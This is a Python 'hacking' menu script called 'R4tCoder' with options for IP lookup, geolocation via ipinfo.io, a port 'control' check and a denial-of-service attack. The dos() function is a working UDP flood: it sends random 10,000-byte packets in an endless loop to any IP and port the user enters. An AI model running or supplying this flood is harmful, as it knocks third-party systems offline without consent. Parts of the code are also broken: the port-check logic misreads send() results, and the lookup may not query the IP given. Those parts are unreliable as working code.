import random
import requests
import os
import socket
from pyfiglet import figlet_format
from colorama import init, Fore

os.system("clear")
banner = figlet_format("R4tCoder",font="slant")
def menu():
   print(Fore.RED + banner + Fore.RESET)
menu()
print(Fore.GREEN + "   ----------->>Ratmen Ip<<---------------")
print(Fore.GREEN + "   ----------->>t.me/sware<<---------------\n")

print(Fore.RED + "[1]" + Fore.GREEN + ": " + Fore.CYAN + "Ip Control")
print(Fore.RED + "[2]" + Fore.GREEN + ": " + Fore.CYAN + "My İp")
print(Fore.RED + "[3]" + Fore.GREEN + ": " + Fore.CYAN + "DoS")
print(Fore.RED + "[4]" + Fore.GREEN + ": " + Fore.CYAN + "Find İp Location")
print(Fore.RED + "[5]" + Fore.GREEN + ": " + Fore.CYAN + "Exit")

x = int(input(Fore.CYAN + "Ratmen " + Fore.RED + "~ " + Fore.RESET))

def control():
   try:
      a = "\33[1;0m"
      print("İp: ")
      ip = input(Fore.CYAN + "Ratmen ~ " + Fore.RESET)
      ip_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      ip_control.connect((ip, 2505))
      ip_control.send(a.encode("utf-8"))
   except ConnectionRefusedError:
      print("Refused Error. ")
   while True:
      if ip_control.send(a.encode("utf-8")) == 200:
         print(Fore.RED + f"Open : {a.encode}")
      elif ip_control.send(a.encode("utf-8")) == 0:
         print(Fore.RED + f"Close : {a.encode}")
      else:
         print("Error.")

def my_ip():
   url = "https://ipinfo.io"
   pyload = {}
   my = requests.post(url=url, json=pyload)
   my_data = my.json()
   ip = my_data['ip']
   print(Fore.RED + "Ip " + Fore.GREEN + ": " + Fore.CYAN + ip)
   hostname = my_data['hostname']
   print(Fore.RED + "Hostname " + Fore.GREEN + ": " + Fore.CYAN + hostname)
   city = my_data['city']
   print(Fore.RED + "City " + Fore.GREEN + ": " + Fore.CYAN + city)
   region = my_data['region']
   print(Fore.RED + "Region " + Fore.GREEN + ": " + Fore.CYAN + region)
   country = my_data['country']
   print(Fore.RED + "Country " + Fore.GREEN + ": " + Fore.CYAN + country)
   loc = my_data['loc']
   print(Fore.RED + "Loc " + Fore.GREEN + ": " + Fore.CYAN + loc)
   org = my_data['org']
   print(Fore.RED + "Org " + Fore.GREEN + ": " + Fore.CYAN + org)
   postal = my_data['postal']
   print(Fore.RED + "Postal " + Fore.GREEN + ": " + Fore.CYAN + postal)
   timezone = my_data['timezone']
   print(Fore.RED + "Timezone " + Fore.GREEN + ": " + Fore.CYAN + timezone)

def dos():
   ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   print(Fore.GREEN + "Ip: ")
   ip = input(Fore.RED + "Ratmen " + Fore.CYAN + "~ ")
   print(Fore.GREEN + "Port: ")
   port = int(input(Fore.RED + "Ratmen " + Fore.CYAN + "~ "))
   ddos.connect((ip, port))
   byte = random._urandom(10000)
   while True:
      ddos.send(byte)
      print(Fore.RED + "Rat" + Fore.GREEN + "Men")

def finder():
   print(Fore.RED + "İp: ")
   find_ip = input(Fore.GREEN + "Ratmen " + Fore.CYAN + "~ ")
   url = "https://ipinfo.io"
   pyload = {'ip': find_ip}
   find = requests.post(url=url, json=pyload)
   find_data = find.json()
   ip = find_data['ip']
   print(Fore.RED + "Ip " + Fore.GREEN + ": " + Fore.CYAN + ip)
   hostname = find_data['hostname']
   print(Fore.RED + "Hostname " + Fore.GREEN + ": " + Fore.CYAN + hostname)
   city = find_data['city']
   print(Fore.RED + "City " + Fore.GREEN + ": " + Fore.CYAN + city)
   region = find_data['region']
   print(Fore.RED + "Region " + Fore.GREEN + ": " + Fore.CYAN + region)
   country = find_data['country']
   print(Fore.RED + "Country " + Fore.GREEN + ": " + Fore.CYAN + country)
   loc = find_data['loc']
   print(Fore.RED + "Loc " + Fore.GREEN + ": " + Fore.CYAN + loc)
   org = find_data['org']
   print(Fore.RED + "Org " + Fore.GREEN + ": " + Fore.CYAN + org)
   postal = find_data['postal']
   print(Fore.RED + "Postal " + Fore.GREEN + ": " + Fore.CYAN + postal)
   timezone = find_data['timezone']
   print(Fore.RED + "Timezone " + Fore.GREEN + ": " + Fore.CYAN + timezone)

if x == 1:
   control()
elif x == 2:
   my_ip()
elif x == 3:
   dos()
elif x == 4:
   finder()
elif x == 5:
   exit()
